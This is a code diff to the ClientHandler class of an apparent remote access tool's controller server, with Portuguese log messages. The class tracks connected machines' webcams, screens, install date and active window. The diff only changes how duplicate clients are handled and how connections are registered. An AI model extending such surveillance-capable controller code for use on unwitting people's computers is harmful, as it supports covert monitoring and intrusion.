@@ -48,7 +48,6 @@ public class ClientHandler implements Runnable {
     private ServerSocket viewSocket;
     private ServerSocket fileSocket;
     private long pingTest = 0L;
-    private boolean loaded = false;
     private long screenMillis = 0L;
     private long webcamMillis = 0L;
     private boolean auth = false;
@@ -127,14 +126,15 @@ public class ClientHandler implements Runnable {
                     clientName = args[1];
                     installDate = args[2];
                     os = args[3];
-                    if (ConnectServer.CONNECTED_KEYS.contains(clientKey)) {
-                        if (ConnectServer.DISCONNECT_DUPLICATE) {
-                            clientSocket.close();
-                        }
-                        continue;
+                    if (ConnectServer.CONNECTED_KEYS.contains(clientKey) && ConnectServer.DISCONNECT_DUPLICATE) {
+                        clientSocket.close();
+                        return;
                     }
-                    loaded = true;
+                    auth = true;
                     ConnectServer.CONNECTED_KEYS.add(clientKey);
+                    ConnectServer.msg("Conexão com cliente " + getClientInfo() + " estabelecida!");
+                    ServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                    ServerAudioComponents.generateBeep(100, 1500, true);
                 } else if (command.startsWith("updateinfo ")) {
                     String[] args = command.split(" ", 4);
                     screens = Integer.parseInt(args[1]);
@@ -608,7 +608,7 @@ public class ClientHandler implements Runnable {
 
     public void closeConnection(String message) {
         ConnectServer.msg("Cliente " + getClientInfo() + " desconectado. (" + message + ")");
-        if (loaded) {
+        if (auth) {
             ConnectServer.CONNECTED_KEYS.remove(getClientKey());
         }
         ConnectServer.CLIENTS.remove(getClientId());
